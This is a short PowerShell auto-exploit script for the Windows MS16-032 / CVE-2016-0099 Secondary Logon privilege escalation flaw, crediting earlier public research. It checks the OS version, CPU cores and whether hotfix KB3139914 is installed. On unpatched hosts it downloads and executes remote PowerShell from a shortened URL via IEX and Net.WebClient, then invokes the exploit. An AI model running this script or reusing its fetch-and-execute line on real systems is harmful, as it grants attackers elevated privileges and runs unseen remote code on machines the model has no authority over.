<#
    File: MS16-032_AutoPwn.ps1
    Author: @xillwillx
    License: GNU General Public License v3.0
#> 

function Get-OSVersion {
$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
$Script:OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
}

#######################################################################################################################################
# CVE-2016-0099 / MS16-032 - Secondary Logon Elevation of Privilege Vulnerability
# Based on the work of @FuzzySec & @tiraniddo
# https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1
# https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html
# Windows 7 SP1 / Windows Server 2008 & R2 SP1 / Windows 8 & 8.1 / Windows Server 2012 & R2 / Windows 10 - Pre-Anniversary Build 14393
#######################################################################################################################################

function MS16-032{
	Get-OSVersion
	echo "[?] Checking for CVE-2016-0099 / MS16-032 - Secondary Logon PrivEsc Vuln"
	if (!($([System.Environment]::ProcessorCount) -eq 1)){"[+] CPU core count=$([System.Environment]::ProcessorCount)";
	switch ($OSMajorMinor)
	{
		'10.0' # Win10 / 2k16
		{echo "[?] Target is Win 10";if($OSVersion.Build -lt 14393){"[!] Pre-Anniversary Build"}else{"[x] Patched, Not Exploitable!";return;}}

		'6.3' # Win8.1 / 2k12R2
		{echo "[?] Target is Win 8.1"}

		'6.2' # Win8 / 2k12
		{echo "[?] Target is Win 8"}

		'6.1' # Win7 / 2k8R2
		{echo "[?] Target is Win 7"}
	}
		if(!(get-hotfix -id KB3139914 -ea 0)){"[!] Hotfix not found, Exploiting!";IEX (New-Object Net.WebClient).DownloadString('https://goo.gl/wrlBsL');Invoke-ms16-032}else{"[x] Not Exploitable!"}
	}else
	{"[x] race condition requires at least 2 CPU cores, not exploitable"}
}
